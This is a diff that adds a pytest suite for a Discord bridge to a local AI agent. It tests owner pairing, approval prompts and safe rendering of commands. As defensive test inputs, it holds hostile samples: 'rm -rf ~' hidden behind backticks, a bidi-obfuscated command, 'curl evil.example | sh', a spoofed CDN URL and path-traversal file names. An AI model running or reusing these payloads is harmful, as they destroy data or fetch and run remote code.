@@ -1,0 +1,695 @@
+# Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
+# SPDX-License-Identifier: MIT
+"""The Discord adapter's rules, driven through a fake transport and agent."""
+
+from __future__ import annotations
+
+import os
+import time
+from pathlib import Path
+
+import pytest
+
+from gaia.messaging.discord import adapter as da
+from gaia.messaging.discord import state
+
+EPOCH_MS = 1420070400000
+
+
+def snowflake(at: float) -> str:
+    return str((int(at * 1000) - EPOCH_MS) << 22)
+
+
+class FakeTransport:
+    def __init__(self):
+        self.sent = []
+        self.edits = []
+        self.pinned = []
+        self.pin_list = []
+        self.deleted = []
+        self.missed = 0
+        self._next = 1000
+
+    def send(self, channel_id, text, *, buttons=None, file_path=None, file_text=None):
+        self._next += 1
+        mid = str(self._next)
+        self.sent.append(
+            {
+                "id": mid,
+                "channel": channel_id,
+                "text": text,
+                "buttons": buttons,
+                "file_path": file_path,
+                "file_text": file_text,
+            }
+        )
+        return mid
+
+    def edit(self, channel_id, message_id, text, *, clear_buttons=False):
+        self.edits.append((channel_id, message_id, text, clear_buttons))
+
+    def delete(self, channel_id, message_id):
+        self.deleted.append(message_id)
+
+    def count_from_after(self, channel_id, author_id, after_id):
+        return self.missed
+
+    def pins(self, channel_id):
+        return list(self.pin_list)
+
+    def pin(self, channel_id, message_id):
+        self.pinned.append(message_id)
+        sent = next(m for m in self.sent if m["id"] == message_id)
+        self.pin_list.append(da.PinnedMessage(message_id, BOT, sent["text"]))
+
+
+class FakeChannel:
+    def __init__(self, **kwargs):
+        self.kwargs = kwargs
+        self.on_event = kwargs["on_event"]
+        self.turns = []
+        self.decisions = []
+        self.cancelled = 0
+        self.closed = False
+
+    def start(self):
+        pass
+
+    def submit(self, turn):
+        self.turns.append(turn)
+        return 0
+
+    def decide(self, decision, confirm_id=None):
+        self.decisions.append((decision, confirm_id))
+
+    def cancel(self):
+        self.cancelled += 1
+
+    def close(self):
+        self.closed = True
+
+
+BOT = "900"
+OWNER = "111"
+DM = "555"
+
+
+@pytest.fixture(autouse=True)
+def gaia_home(tmp_path, monkeypatch):
+    monkeypatch.setenv("GAIA_CONFIG_DIR", str(tmp_path))
+    return tmp_path
+
+
+class Clock:
+    def __init__(self):
+        self.now = time.time()
+
+    def __call__(self):
+        return self.now
+
+
+def make(paired=True, **kwargs):
+    config = state.BridgeConfig(
+        bot_id=BOT, bot_name="gaia-bot", application_id="77", instance_id="a" * 16
+    )
+    if paired:
+        config.owner_id, config.owner_name, config.dm_channel_id = OWNER, "me", DM
+    clock = kwargs.pop("clock", Clock())
+    adapter = da.DiscordAdapter(
+        config,
+        FakeTransport(),
+        agent_argv=["fake-agent"],
+        channel_factory=FakeChannel,
+        clock=clock,
+        code_factory=lambda: "ABCD2345",
+        hostname="desk",
+        **kwargs,
+    )
+    adapter.start_agent()
+    return adapter, clock
+
+
+def message(clock, text="hi", author=OWNER, channel=DM, **kwargs):
+    fields = dict(
+        id=snowflake(clock.now),
+        channel_id=channel,
+        author_id=author,
+        author_name="me",
+        is_dm=True,
+        content=text,
+    )
+    fields.update(kwargs)
+    return da.InboundMessage(**fields)
+
+
+# ----------------------------------------------------------------------
+# Construction and pairing
+# ----------------------------------------------------------------------
+
+
+def test_refuses_to_exist_without_a_connected_bot():
+    with pytest.raises(ValueError, match="Connect Discord"):
+        da.DiscordAdapter(state.BridgeConfig(), FakeTransport())
+
+
+def test_unpaired_bridge_shows_a_code_and_answers_nobody():
+    ad, clock = make(paired=False)
+    ad.on_ready()
+    status = state.read_status()
+    assert ad.current_state == state.STATE_PAIRING
+    assert status.pairing_code == "ABCD2345"
+
+    ad.handle_message(
+        message(clock, "what's in my documents?", author="222", channel="9")
+    )
+    assert ad._agent().turns == [], "an unpaired bridge must never run a turn"
+    assert da.PAIRING_PROMPT in ad.transport.sent[-1]["text"]
+
+
+def test_the_sender_of_the_code_becomes_the_only_user():
+    ad, clock = make(paired=False)
+    ad.on_ready()
+    ad.handle_message(message(clock, "abcd 2345", author="333", channel="44"))
+    assert ad.current_state == state.STATE_CONNECTED
+    saved = state.load_config()
+    assert (saved.owner_id, saved.dm_channel_id) == ("333", "44")
+    assert ad.transport.pinned, "pairing must claim the lease"
+    assert "Paired" in ad.transport.sent[-1]["text"]
+    assert state.read_status().pairing_code == "", "a used code must not stay visible"
+
+
+def test_wrong_guesses_rotate_the_code():
+    codes = iter(["FIRST234", "SECOND56"])
+    ad, clock = make(paired=False)
+    ad._code_factory = lambda: next(codes)
+    ad.on_ready()
+    for i in range(da.PAIRING_MAX_GUESSES):
+        clock.now += 0.001
+        ad.handle_message(message(clock, f"guess{i}", author="666"))
+    assert ad.current_state == state.STATE_PAIRING
+    assert state.read_status().pairing_code == "SECOND56"
+    clock.now += 0.001
+    ad.handle_message(message(clock, "FIRST234", author="666"))
+    assert ad.current_state == state.STATE_PAIRING, "a rotated-out code must not pair"
+
+
+def test_an_expired_code_is_replaced_on_tick():
+    codes = iter(["OLDCODE2", "NEWCODE3"])
+    ad, clock = make(paired=False)
+    ad._code_factory = lambda: next(codes)
+    ad.on_ready()
+    clock.now += da.PAIRING_TTL_SECONDS + 1
+    ad.tick()
+    assert state.read_status().pairing_code == "NEWCODE3"
+
+
+# ----------------------------------------------------------------------
+# Who and what is answered
+# ----------------------------------------------------------------------
+
+
+def test_owner_dm_runs_a_turn():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "summarize my notes"))
+    turns = ad._agent().turns
+    assert len(turns) == 1 and turns[0].text.startswith("summarize my notes")
+    assert da.DISCORD_REPLY_NOTE in turns[0].text, "replies read on a phone need links"
+    assert ad.transport.sent[-1]["text"] == "-# Thinking…"
+
+
+@pytest.mark.parametrize(
+    "overrides",
+    [
+        {"is_dm": False},
+        {"author_is_bot": True},
+        {"author": BOT},
+    ],
+    ids=["server-channel", "other-bot", "itself"],
+)
+def test_non_dm_and_bot_messages_are_ignored(overrides):
+    ad, clock = make()
+    ad.on_ready()
+    sent_before = len(ad.transport.sent)
+    author = overrides.pop("author", OWNER)
+    ad.handle_message(message(clock, "run it", author=author, **overrides))
+    assert ad._agent().turns == []
+    assert len(ad.transport.sent) == sent_before
+
+
+def test_a_replayed_message_runs_once():
+    ad, clock = make()
+    ad.on_ready()
+    msg = message(clock, "once")
+    ad.handle_message(msg)
+    ad.handle_message(msg)
+    assert len(ad._agent().turns) == 1
+
+
+def test_a_stranger_is_refused_once_even_across_restarts():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "hello", author="222", channel="8"))
+    clock.now += 0.001
+    ad.handle_message(message(clock, "hello?", author="222", channel="8"))
+    refusals = [m for m in ad.transport.sent if m["text"] == da.UNAUTHORIZED_REPLY]
+    assert len(refusals) == 1
+    assert ad._agent().turns == []
+
+    again, clock2 = make()
+    again.on_ready()
+    again.handle_message(message(clock2, "still me", author="222", channel="8"))
+    assert not [m for m in again.transport.sent if m["text"] == da.UNAUTHORIZED_REPLY]
+
+
+def test_a_stale_message_is_never_run():
+    ad, clock = make()
+    ad.on_ready()
+    old = message(clock, "delete the folder")
+    old.id = snowflake(clock.now - da.STALE_SECONDS - 5)
+    ad.handle_message(old)
+    assert ad._agent().turns == []
+    assert "didn't run it" in ad.transport.sent[-1]["text"]
+
+
+def test_missed_messages_are_counted_not_replayed():
+    ad, clock = make()
+    ad._last_message_id = snowflake(clock.now - 3600)
+    ad.transport.missed = 3
+    ad.on_ready(resumed=False)
+    assert "missed 3 messages" in ad.transport.sent[-1]["text"]
+    assert ad._agent().turns == []
+
+
+# ----------------------------------------------------------------------
+# Approvals
+# ----------------------------------------------------------------------
+
+
+def _prompt(ad, clock, **event):
+    ad.handle_message(message(clock, "clean up"))
+    turn = ad._agent().turns[-1]
+    payload = {
+        "type": "needs_confirmation",
+        "action": "run a shell command",
+        "summary": "rm -rf build",
+        "confirm_id": "c-1",
+    }
+    payload.update(event)
+    ad._on_agent_event(payload, turn)
+    return ad.transport.sent[-1]
+
+
+def test_approval_shows_allow_and_deny_but_always_only_with_a_scope():
+    ad, clock = make()
+    ad.on_ready()
+    posted = _prompt(ad, clock)
+    assert [b.custom_id for b in posted["buttons"]] == [da.BUTTON_ALLOW, da.BUTTON_DENY]
+
+    clock.now += 0.001
+    scoped = _prompt(ad, clock, confirm_id="c-2", always_scope="`ls`")
+    assert da.BUTTON_ALWAYS in [b.custom_id for b in scoped["buttons"]]
+
+
+def test_the_answer_lands_below_the_prompt():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "clean up"))
+    turn = ad._agent().turns[-1]
+    placeholder = turn.context.reply_id
+    ad._on_agent_event(
+        {
+            "type": "needs_confirmation",
+            "action": "run",
+            "summary": "ls",
+            "confirm_id": "c-9",
+        },
+        turn,
+    )
+    prompt_id = ad.transport.sent[-1]["id"]
+    assert ad.transport.deleted == [placeholder]
+    ad._on_agent_event({"type": "final", "answer": "done"}, turn)
+    final = ad.transport.sent[-1]
+    assert final["text"] == "done" and final["id"] > prompt_id
+
+
+def test_only_the_owner_in_their_dm_can_approve():
+    ad, clock = make()
+    ad.on_ready()
+    posted = _prompt(ad, clock)
+    stranger = da.InboundClick(posted["id"], DM, "222", da.BUTTON_ALLOW)
+    other_channel = da.InboundClick(posted["id"], "999", OWNER, da.BUTTON_ALLOW)
+    assert ad.handle_click(stranger) == "This button isn't for you."
+    assert ad.handle_click(other_channel) == "This button isn't for you."
+    assert ad._agent().decisions == []
+
+    assert (
+        ad.handle_click(da.InboundClick(posted["id"], DM, OWNER, da.BUTTON_ALLOW))
+        is None
+    )
+    assert ad._agent().decisions == [("allow", "c-1")]
+    assert ad.transport.edits[-1][3] is True, "the buttons must be removed"
+
+    again = ad.handle_click(da.InboundClick(posted["id"], DM, OWNER, da.BUTTON_DENY))
+    assert "expired or was already answered" in again
+    assert ad._agent().decisions == [("allow", "c-1")]
+
+
+def test_a_click_on_an_unrecorded_message_answers_nothing():
+    ad, clock = make()
+    ad.on_ready()
+    _prompt(ad, clock)
+    note = ad.handle_click(da.InboundClick("424242", DM, OWNER, da.BUTTON_ALLOW))
+    assert "expired" in note
+    assert ad._agent().decisions == []
+
+
+def test_a_stale_click_answers_nothing():
+    ad, clock = make()
+    ad.on_ready()
+    posted = _prompt(ad, clock)
+    click = da.InboundClick(
+        posted["id"],
+        DM,
+        OWNER,
+        da.BUTTON_ALLOW,
+        interaction_id=snowflake(clock.now - da.STALE_SECONDS - 1),
+    )
+    assert "too late" in ad.handle_click(click)
+    assert ad._agent().decisions == []
+
+
+def test_a_prompt_without_an_id_is_denied_without_buttons():
+    ad, clock = make()
+    ad.on_ready()
+    posted = _prompt(ad, clock, confirm_id="")
+    assert posted["buttons"] is None
+    assert ad._agent().decisions == [("deny", None)]
+
+
+def test_an_unanswered_prompt_is_denied():
+    ad, clock = make(confirm_timeout=0.05)
+    ad.on_ready()
+    _prompt(ad, clock)
+    deadline = time.time() + 2
+    while not ad._agent().decisions and time.time() < deadline:
+        time.sleep(0.02)
+    assert ad._agent().decisions == [("deny", "c-1")]
+    assert "no answer" in ad.transport.edits[-1][2]
+
+
+def test_closing_expires_open_prompts():
+    ad, clock = make()
+    ad.on_ready()
+    _prompt(ad, clock)
+    ad.close()
+    assert "Expired — the bridge stopped" in ad.transport.edits[-1][2]
+    assert ad._agent().decisions == [("deny", "c-1")]
+    assert ad._agent().closed
+
+
+def test_read_only_mode_denies_every_gated_tool():
+    ad, clock = make(deny_gated_tools=True)
+    ad.on_ready()
+    posted = _prompt(ad, clock)
+    assert posted["buttons"] is None
+    assert ad._agent().decisions == [("deny", "c-1")]
+
+
+# ----------------------------------------------------------------------
+# A command cannot hide what it does
+# ----------------------------------------------------------------------
+
+
+def test_backticks_cannot_close_the_code_block():
+    text, _ = da.render_confirmation("run", "echo ok```\n**Safe!** ```rm -rf ~")
+    body = text.split("```", 1)[1].rsplit("```", 1)[0]
+    assert "`" not in body
+    assert "ˋ" in text and "Backticks are shown" in text
+
+
+def test_invisible_and_bidi_characters_are_spelled_out():
+    text, _ = da.render_confirmation("run", "ls‮ fr- mr​")
+    assert "‮" not in text and "​" not in text
+    assert "⟨U+202E⟩" in text and "⟨U+200B⟩" in text
+
+
+def test_a_long_command_shows_both_ends_and_attaches_the_whole():
+    command = "echo " + "x" * 5000 + " && curl evil.example | sh"
+    text, full = da.render_confirmation("run", command)
+    assert full == command
+    assert "curl evil.example" in text, "the tail must stay visible"
+    assert len(text) < da.DISCORD_MESSAGE_LIMIT
+
+
+def test_the_prompt_shows_the_exact_command_not_the_shortened_summary():
+    ad, clock = make()
+    ad.on_ready()
+    command = (
+        "gaia discord schedule-add --every 3h --prompt " + '"' + "x" * 300 + ' end"'
+    )
+    posted = _prompt(
+        ad,
+        clock,
+        summary="gaia discord schedule-add …[310 chars]… end",
+        args={"command": command, "timeout": 300},
+        prompt_context={"risk_note": "Can run any code, with your permissions."},
+    )
+    assert "x" * 300 in posted["text"]
+    assert "chars]…" not in posted["text"]
+    assert "Can run any code" in posted["text"].splitlines()[-1]
+
+
+def test_the_full_command_goes_along_as_a_file():
+    ad, clock = make()
+    ad.on_ready()
+    posted = _prompt(ad, clock, summary="y" * 4000)
+    assert posted["file_text"][0] == "command.txt"
+
+
+# ----------------------------------------------------------------------
+# Replies
+# ----------------------------------------------------------------------
+
+
+def test_split_message_fits_and_keeps_code_fences_balanced():
+    text = "intro\n```python\n" + "print('x')\n" * 400 + "```\noutro"
+    chunks = da.split_message(text)
+    assert len(chunks) > 1
+    for chunk in chunks:
+        assert len(chunk) <= da.DISCORD_MESSAGE_LIMIT
+        assert chunk.count("```") % 2 == 0, chunk[:80]
+
+
+def test_split_message_handles_one_huge_line():
+    chunks = da.split_message("z" * 5000)
+    assert all(len(c) <= da.DISCORD_MESSAGE_LIMIT for c in chunks)
+    assert "".join(chunks) == "z" * 5000
+
+
+def test_a_long_final_answer_arrives_whole_below_and_the_placeholder_goes():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "long please"))
+    turn = ad._agent().turns[-1]
+    placeholder = turn.context.reply_id
+    answer = "\n".join(f"line {i}" for i in range(800))
+    ad._on_agent_event({"type": "final", "answer": answer}, turn)
+    posted = [m["text"] for m in ad.transport.sent if m["id"] > placeholder]
+    assert len(posted) > 1
+    assembled = "".join(posted)
+    assert "line 0\n" in assembled and "line 799" in assembled
+    assert ad.transport.deleted == [placeholder]
+
+
+def test_thinking_aloud_never_reaches_discord():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "summarize"))
+    turn = ad._agent().turns[-1]
+    for event in (
+        {"type": "token", "delta": "Hmm, let me also consider the memory note…"},
+        {"type": "status", "message": "Hmm, actually I could batch the gh calls"},
+        {"type": "tool_call", "tool": "run_shell_command", "args": {}},
+        {"type": "token", "delta": "Here is the summary."},
+        {"type": "final", "answer": ""},
+    ):
+        ad._on_agent_event(event, turn)
+    texts = [m["text"] for m in ad.transport.sent] + [e[2] for e in ad.transport.edits]
+    assert not any("Hmm" in t for t in texts)
+    assert ad.transport.sent[-1]["text"].startswith("Here is the summary.")
+
+
+def test_a_written_file_is_uploaded_only_from_an_upload_root(tmp_path):
+    inside = tmp_path / "root" / "out.txt"
+    inside.parent.mkdir()
+    inside.write_text("ok")
+    outside = tmp_path / "elsewhere.txt"
+    outside.write_text("secret")
+    ad, clock = make(upload_roots=[str(inside.parent)])
+    ad.on_ready()
+    ad.handle_message(message(clock, "write it"))
+    turn = ad._agent().turns[-1]
+    for path in (outside, inside):
+        ad._on_agent_event(
+            {
+                "type": "tool_call",
+                "tool": "write_file",
+                "args": {"file_path": str(path)},
+            },
+            turn,
+        )
+        ad._on_agent_event({"type": "tool_result", "data": {"success": True}}, turn)
+    uploads = [m["file_path"] for m in ad.transport.sent if m["file_path"]]
+    assert uploads == [inside.resolve()]
+
+
+def test_a_mid_run_question_ends_the_turn():
+    ad, clock = make()
+    ad.on_ready()
+    ad.handle_message(message(clock, "book it"))
+    turn = ad._agent().turns[-1]
+    ad._on_agent_event({"type": "needs_input", "question": "Which day?"}, turn)
+    assert "Which day?" in ad.transport.sent[-1]["text"]
+    assert ad._agent().cancelled == 1
+
+
+# ----------------------------------------------------------------------
+# One PC per bot
+# ----------------------------------------------------------------------
+
+
+def _foreign_lease(ad, at):
+    return da.PinnedMessage(
+        "1", BOT, f"{da.LEASE_PREFIX} **laptop**\n-# lease {'b' * 16} at {int(at)}"
+    )
+
+
+def test_a_fresh_lease_from_another_pc_stands_this_one_down():
+    ad, clock = make()
+    ad.transport.pin_list.append(_foreign_lease(ad, clock.now - 10))
+    ad.on_ready()
+    assert ad.current_state == state.STATE_TAKEN_OVER
+    ad.handle_message(message(clock, "anyone?"))
+    assert ad._agent().turns == []
+
+
+def test_a_stale_lease_is_taken():
+    ad, clock = make()
+    ad.transport.pin_list.append(
+        _foreign_lease(ad, clock.now - da.LEASE_FRESH_SECONDS - 5)
+    )
+    ad.on_ready()
+    assert ad.current_state == state.STATE_CONNECTED
+    assert ad.transport.pinned
+
+
+def test_a_newer_lease_seen_on_heartbeat_stands_down_and_comes_back_when_stale():
+    ad, clock = make()
+    ad.on_ready()
+    clock.now += 30
+    ad.transport.pin_list.append(_foreign_lease(ad, clock.now))
+    ad.tick()
+    assert ad.current_state == state.STATE_TAKEN_OVER
+    clock.now += da.LEASE_FRESH_SECONDS + 1
+    ad.tick()
+    assert ad.current_state == state.STATE_CONNECTED
+
+
+def test_take_over_claims_a_fresh_foreign_lease():
+    ad, clock = make()
+    ad.transport.pin_list.append(_foreign_lease(ad, clock.now))
+    ad.on_ready(take_over=True)
+    assert ad.current_state == state.STATE_CONNECTED
+
+
+def test_a_user_pinned_message_is_not_a_lease():
+    ad, clock = make()
+    ad.transport.pin_list.append(
+        da.PinnedMessage("2", OWNER, f"lease {'c' * 16} at {int(clock.now)}")
+    )
+    ad.on_ready()
+    assert ad.current_state == state.STATE_CONNECTED
+
+
+# ----------------------------------------------------------------------
+# Pure helpers
+# ----------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "url,ok",
+    [
+        ("https://cdn.discordapp.com/attachments/1/2/a.pdf", True),
+        ("https://media.discordapp.net/attachments/1/2/a.png", True),
+        ("http://cdn.discordapp.com/attachments/1/2/a.pdf", False),
+        ("https://cdn.discordapp.com@evil.example/a.pdf", False),
+        ("https://evil.example/cdn.discordapp.com/a.pdf", False),
+    ],
+)
+def test_attachments_come_only_from_discords_cdn(url, ok):
+    assert da.is_discord_cdn(url) is ok
+
+
+@pytest.mark.parametrize(
+    "name,expected",
+    [
+        ("../../.ssh/config", "t-config"),
+        ("..\\..\\boot.ini", "t-boot.ini"),
+        ("CON.txt", "t-_CON.txt"),
+        ("report.pdf...", "t-report.pdf"),
+        ("a:stream.txt", "t-a_stream.txt"),
+    ],
+)
+def test_attachment_names_cannot_escape_or_be_special(name, expected):
+    assert da.safe_filename(name, "t") == expected
+
+
+def test_snowflake_time_round_trips():
+    now = time.time()
+    assert abs(da.snowflake_time(snowflake(now)) - now) < 0.01
+
+
+def test_the_transport_never_listens_for_edits():
+    source = Path(da.__file__).with_name("transport.py").read_text(encoding="utf-8")
+    assert "on_message_edit" not in source and "on_raw_message_edit" not in source
+
+
+def test_the_bridge_has_no_way_to_disarm_the_gate():
+    for name in ("adapter.py", "transport.py", "cli.py"):
+        source = Path(da.__file__).with_name(name).read_text(encoding="utf-8")
+        assert '"bypass"' not in source and "'bypass'" not in source, name
+        assert "CONTROL_BYPASS" not in source, name
+
+
+def test_overlapping_ticks_do_not_run_twice():
+    ad, clock = make()
+    ad.on_ready()
+    ad._tick_lock.acquire()
+    try:
+        calls = []
+        ad._tick = lambda: calls.append(1)
+        ad.tick()
+        assert calls == [], "a tick while one is running must be skipped"
+    finally:
+        ad._tick_lock.release()
+
+
+def test_closing_twice_expires_prompts_once():
+    ad, clock = make()
+    ad.on_ready()
+    _prompt(ad, clock)
+    ad.close()
+    edits = len(ad.transport.edits)
+    ad.close()
+    assert len(ad.transport.edits) == edits
+
+
+def test_the_agent_gets_only_a_gaia_shim_and_never_the_token(monkeypatch):
+    from gaia.messaging.discord import credentials
+
+    monkeypatch.setenv(credentials.BOT_TOKEN_ENV_VAR, "secret-token")
+    env = da._agent_env()
+    assert credentials.BOT_TOKEN_ENV_VAR not in env
+    first = env["PATH"].split(os.pathsep)[0]
+    assert sorted(p.name for p in Path(first).iterdir()) in (["gaia"], ["gaia.exe"])
